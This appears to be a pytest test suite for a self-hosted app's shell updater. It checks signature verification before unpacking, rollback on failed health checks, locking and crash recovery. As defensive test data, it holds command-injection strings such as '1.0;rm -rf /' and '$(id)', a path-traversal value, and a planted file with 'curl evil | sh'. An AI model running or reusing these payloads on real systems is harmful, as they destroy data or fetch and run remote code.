"""#146/#149: the LXC's updater (deploy/companion-update) with fakes for the network, systemd and the verifier:
nothing downloaded runs before it is verified, bad versions never reach a URL, one update at a time, a failed
health check rolls back (release and data), an interrupted update is undone."""

import fcntl
import hashlib
import io
import subprocess
import tarfile
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
UPDATER = ROOT / "deploy" / "companion-update"

# Stand-ins: curl (downloads from $SERVE, the latest-release redirect from $LATEST, /healthz by $HEALTH),
# systemctl (a sync runs while $RUN=1), python3 -m venv (an empty venv whose pip succeeds). Every call is logged.
FAKES = r'''
curl() {
  echo "curl $*" >>"$LOG"
  case "$*" in
  *healthz*) [[ "${HEALTH:-}" == ok ]] && echo '{"ok":true}' || return 22 ;;
  *releases/latest*) printf '%s' "https://github.com/waldonso2/wealthfolio-companion/releases/tag/v${LATEST:-}" ;;
  *) local url="${*: -3:1}"; [[ -f "$SERVE/${url##*/}" ]] || return 22; cp "$SERVE/${url##*/}" "${*: -1}" ;;
  esac
}
systemctl() {
  echo "systemctl $*" >>"$LOG"
  [[ "$1" == is-active && "$*" == *run.service* ]] && { [[ "${RUN:-}" == 1 ]]; return; }
  return 0
}
python3() {
  echo "python3 $*" >>"$LOG"
  mkdir -p "$3/bin" && printf '#!/bin/sh\nexit 0\n' >"$3/bin/pip" &&
    printf '#!/bin/sh\necho "verify $*" >>"$LOG"\nexit "${PROVENANCE:-0}"\n' >"$3/bin/python" &&
    chmod +x "$3/bin/pip" "$3/bin/python"
}
tar() { echo "tar $*" >>"$LOG"; command tar "$@"; }
sleep() { :; }
'''

# A release's setup.sh: build makes a venv whose CLI tells the tree's version; configure logs itself.
SETUP = r'''#!/usr/bin/env bash
set -eu
case "$1" in
build)
  mkdir -p "$COMPANION_VENV/bin"
  printf '#!/bin/sh\ncat %s/version\n' "$COMPANION_APP" >"$COMPANION_VENV/bin/wealthfolio-companion"
  chmod +x "$COMPANION_VENV/bin/wealthfolio-companion"
  echo "build $(cat "$COMPANION_APP/version")" >>"$LOG"
  [[ "${FAIL_BUILD:-}" != 1 ]] ;;
configure)
  echo "configure $(cat "$COMPANION_BASE/app/version")" >>"$LOG"
  # 0.2.0 migrates the data (an older version could not open it any more).
  if [[ "$(cat "$COMPANION_BASE/app/version")" == 0.2.0 ]]; then echo 0.2.0 >"$COMPANION_BASE/data/file"; fi ;;
esac
'''


def _tree(version: str) -> dict[str, bytes]:
    return {"version": f"{version}\n".encode(), "deploy/setup.sh": SETUP.encode(),
            "src/brokersync/provenance.py": b"# verifier\n", "requirements-verify.txt": b"sigstore\n"}


def _publish(serve: Path, version: str, extra: dict[str, bytes] | None = None) -> None:
    """A release as GitHub serves it: the archive (with its prefix) and SHA256SUMS of the tree."""
    files = _tree(version)
    sums = "".join(f"{hashlib.sha256(data).hexdigest()}  ./{name}\n" for name, data in sorted(files.items()))
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for name, data in {**files, **(extra or {})}.items():
            info = tarfile.TarInfo(f"wealthfolio-companion-{version}/{name}")
            info.size, info.mode = len(data), 0o755 if name.endswith(".sh") else 0o644
            tar.addfile(info, io.BytesIO(data))
    serve.mkdir(exist_ok=True)
    (serve / f"wealthfolio-companion-{version}.tar.gz").write_bytes(buf.getvalue())
    (serve / "SHA256SUMS").write_text(sums)


class Box:
    def __init__(self, tmp: Path):
        self.tmp, self.base, self.serve, self.log = tmp, tmp / "base", tmp / "serve", tmp / "log"
        self.base.mkdir()
        self.lock = tmp / "update.lock"
        # The verifier the tests hand to fetch_release: exit $PROVENANCE, logging what it was asked.
        self.verifier = tmp / "verifier"
        self.verifier.write_text('#!/bin/sh\necho "verify $*" >>"$LOG"\nexit "${PROVENANCE:-0}"\n')
        self.verifier.chmod(0o755)

    def run(self, command: str, **env: str) -> subprocess.CompletedProcess:
        self.log.write_text("")
        script = f"source {UPDATER}\n{FAKES}\n{command}"
        environ = {"PATH": "/usr/bin:/bin", "LOG": str(self.log), "SERVE": str(self.serve), "HEALTH": "ok",
                   "COMPANION_BASE": str(self.base), "COMPANION_UPDATE_LOCK": str(self.lock),
                   "COMPANION_HEALTH_TIMEOUT": "0", "COMPANION_VERSION_FILE": str(self.tmp / "installed"),
                   "COMPANION_UPDATE_ENTRY": str(self.tmp / "update"), "COMPANION_UPDATER": str(self.tmp / "cu"),
                   **env}
        return subprocess.run(["bash", "-c", script], env=environ, capture_output=True, text=True)

    def calls(self) -> list[str]:
        return self.log.read_text().splitlines()

    def install(self, version: str, **env: str) -> subprocess.CompletedProcess:
        """Like install/: verified fetch, then the release's own deploy."""
        _publish(self.serve, version)
        return self.run(f'fetch_release {version} "$COMPANION_BASE/../dl-{version}" {self.verifier} x && '
                        f'main --deploy "$COMPANION_BASE/../dl-{version}/app" {version}', **env)

    def current(self) -> str:
        return (self.base / "app" / "version").read_text().strip()


@pytest.fixture
def box(tmp_path):
    return Box(tmp_path)


@pytest.mark.parametrize("bad", ["1.0;touch /tmp/x", "../../etc", "latest", "1.0 ", "$(id)", "1", "v1.0", ""])
def test_a_bad_version_never_reaches_a_url(box, bad):
    result = box.run(f'fetch_release "$BAD" "$COMPANION_BASE/dl" {box.verifier} x', BAD=bad)
    assert result.returncode == 1 and "not a version" in result.stderr
    assert box.calls() == [] and not (box.base / "dl").exists()
    if bad:
        result = box.run("update", VERSION=bad)
        assert result.returncode == 1 and not any(c.startswith("curl") for c in box.calls())


def test_a_bad_latest_release_is_refused(box):
    result = box.run("latest_release", LATEST="1.0;rm -rf /")
    assert result.returncode == 1 and "no valid latest release" in result.stderr


def test_nothing_is_unpacked_before_it_is_verified(box):
    _publish(box.serve, "0.2.0")
    dl = box.base / "dl"
    result = box.run(f'fetch_release 0.2.0 "{dl}" {box.verifier} x', PROVENANCE="1")
    assert result.returncode == 1
    assert not (dl / "app").exists() and not any(c.startswith("tar") for c in box.calls())
    assert oct(dl.stat().st_mode & 0o777) == "0o700"  # downloads land in a private directory
    result = box.run(f'fetch_release 0.2.0 "{box.base / "dl2"}" {box.verifier} x')
    assert result.returncode == 0, result.stderr
    calls = box.calls()
    verify = next(i for i, c in enumerate(calls) if c.startswith("verify"))
    assert calls[verify].endswith("/SHA256SUMS " + str(box.base / "dl2" / "wealthfolio-companion-0.2.0.tar.gz"))
    assert verify < next(i for i, c in enumerate(calls) if c.startswith("tar"))
    assert (box.base / "dl2" / "app" / "version").read_text() == "0.2.0\n"


def test_a_download_failure_or_extra_file_stops_it(box):
    box.serve.mkdir()
    assert box.run(f'fetch_release 0.2.0 "{box.base / "a"}" {box.verifier} x').returncode == 1  # nothing served
    _publish(box.serve, "0.2.0", extra={"evil.sh": b"curl evil | sh\n"})
    result = box.run(f'fetch_release 0.2.0 "{box.base / "b"}" {box.verifier} x')
    assert result.returncode == 1 and "SHA256SUMS doesn't list" in result.stderr


def test_install_then_update_commits_and_keeps_only_the_running_release(box):
    (box.base / "data").mkdir()
    assert box.install("0.1.0").returncode == 0, box.calls()
    assert box.current() == "0.1.0" and (box.base / "current").is_symlink()
    assert (box.tmp / "installed").read_text() == "0.1.0\n"
    _publish(box.serve, "0.2.0")
    result = box.run("main", LATEST="0.2.0")
    assert result.returncode == 0, result.stderr
    assert box.current() == "0.2.0" and not (box.base / "update-pending").exists()
    assert [p.name.split("-")[0] for p in (box.base / "releases").iterdir()] == ["0.2.0"]
    calls = box.calls()
    # verified (with the installed release's verifier: its provenance.py), built before the stop, then switched
    assert any(c.startswith("verify -I") and "/app/src/brokersync/provenance.py" in c for c in calls)
    assert calls.index("build 0.2.0") < next(i for i, c in enumerate(calls) if c.startswith("systemctl stop"))
    backups = list(box.base.glob("backup-*.tar.gz"))
    assert backups and oct(backups[0].stat().st_mode & 0o777) == "0o600"
    # Nothing newer: nothing downloaded.
    assert box.run("main", LATEST="0.2.0").returncode == 0
    assert not any("releases/download" in c for c in box.calls())


def test_a_failed_health_check_rolls_back_release_and_data(box):
    (box.base / "data").mkdir()
    assert box.install("0.1.0").returncode == 0
    (box.base / "data" / "file").write_text("0.1.0 data\n")
    _publish(box.serve, "0.2.0")
    result = box.run("main", LATEST="0.2.0", HEALTH="bad")
    assert result.returncode == 1 and "rolling back" in result.stderr
    assert box.current() == "0.1.0"
    assert (box.base / "data" / "file").read_text() == "0.1.0 data\n"  # the backup, not what 0.2.0 migrated
    assert (box.base / "data.failed" / "file").read_text() == "0.2.0\n"
    assert not (box.base / "update-pending").exists()
    calls = box.calls()
    assert calls.index("configure 0.2.0") < calls.index("configure 0.1.0")
    assert "systemctl enable -q --now wealthfolio-companion wealthfolio-companion-run.timer" in calls[-1:] + calls


def test_a_failed_build_changes_nothing(box):
    (box.base / "data").mkdir()
    assert box.install("0.1.0").returncode == 0
    _publish(box.serve, "0.2.0")
    result = box.run("main", LATEST="0.2.0", FAIL_BUILD="1")
    assert result.returncode == 1 and "nothing changed" in result.stderr
    assert box.current() == "0.1.0" and not any(c.startswith("systemctl stop") for c in box.calls())
    assert [p.name.split("-")[0] for p in (box.base / "releases").iterdir()] == ["0.1.0"]


def test_unverified_releases_never_run(box):
    (box.base / "data").mkdir()
    assert box.install("0.1.0").returncode == 0
    # The installed verifier is the release's venv `verify`: make it refuse.
    python = box.base / "current" / "verify" / "bin" / "python"
    python.write_text('#!/bin/sh\necho "verify $*" >>"$LOG"\nexit 1\n')
    python.chmod(0o755)
    _publish(box.serve, "0.2.0")
    result = box.run("main", LATEST="0.2.0")
    assert result.returncode == 1 and "could not be verified - nothing changed" in result.stderr
    assert box.current() == "0.1.0" and not any(c.startswith(("build", "systemctl stop", "tar")) for c in box.calls())
    assert not list((box.base / "releases").glob(".dl.*"))


def test_one_update_at_a_time(box):
    with open(box.lock, "w") as held:
        fcntl.flock(held, fcntl.LOCK_EX)
        result = box.run("main", LATEST="0.2.0")
    assert result.returncode == 75 and "Another update is running" in result.stderr
    assert box.calls() == []


def test_never_while_a_sync_runs(box):
    (box.base / "data").mkdir()
    assert box.install("0.1.0").returncode == 0
    result = box.run("main", LATEST="0.2.0", RUN="1")
    assert result.returncode == 75 and not any("releases/download" in c for c in box.calls())


def test_an_interrupted_update_is_undone(box):
    (box.base / "data").mkdir()
    assert box.install("0.1.0").returncode == 0
    prev = (box.base / "current").resolve().name
    (box.base / "data" / "file").write_text("before\n")
    backup = box.base / "backup-1.tar.gz"
    subprocess.run(["tar", "-czf", str(backup), "-C", str(box.base), "data"], check=True)
    # Power cut after the switch: a new release current, pending written; plus an unfinished build and download.
    new = box.base / "releases" / "0.2.0-9"
    (new / "app").mkdir(parents=True)
    (new / "app" / "version").write_text("0.2.0\n")
    (box.base / "current").unlink()
    (box.base / "current").symlink_to("releases/0.2.0-9")
    (box.base / "data" / "file").write_text("half migrated\n")
    (box.base / "update-pending").write_text(f"prev={prev}\nbackup={backup}\n")
    half = box.base / "releases" / "0.3.0-9"
    half.mkdir()
    (half / ".incomplete").touch()
    (box.base / "releases" / ".dl.abc").mkdir()
    result = box.run("main --recover")
    assert result.returncode == 0, result.stderr
    assert box.current() == "0.1.0" and (box.base / "data" / "file").read_text() == "before\n"
    assert not half.exists() and not (box.base / "releases" / ".dl.abc").exists()
    assert not (box.base / "update-pending").exists()


def test_the_pending_file_is_never_evaluated(box):
    (box.base / "data").mkdir()
    assert box.install("0.1.0").returncode == 0
    (box.base / "update-pending").write_text("prev=$(touch /tmp/owned)\nbackup=/x;id\n")
    result = box.run("recover")
    assert result.returncode == 0
    assert "Nothing to go back to" in result.stderr and not Path("/tmp/owned").exists()


def test_install_from_an_installation_before_the_release_layout(box):
    """ct/'s one-time bootstrap: real app/ and venv/ directories become releases/legacy, and come back on failure."""
    (box.base / "data").mkdir()
    for d in ("app", "venv/bin"):
        (box.base / d).mkdir(parents=True)
    (box.base / "app" / "version").write_text("0.0.9\n")
    (box.base / "app" / "deploy").mkdir()
    (box.base / "app" / "deploy" / "setup.sh").write_text('echo "legacy setup" >>"$LOG"\n')
    _publish(box.serve, "0.2.0")
    result = box.run(f'fetch_release 0.2.0 "{box.tmp / "dl"}" {box.verifier} x && '
                     f'main --deploy "{box.tmp / "dl" / "app"}" 0.2.0', HEALTH="bad")
    assert result.returncode == 1
    assert not (box.base / "app").is_symlink() and box.current() == "0.0.9" and "legacy setup" in box.calls()
    result = box.run(f'main --deploy "{box.tmp / "dl" / "app"}" 0.2.0')
    assert result.returncode == 0, result.stderr
    assert (box.base / "app").is_symlink() and box.current() == "0.2.0"
    assert not (box.base / "releases" / "legacy").exists()
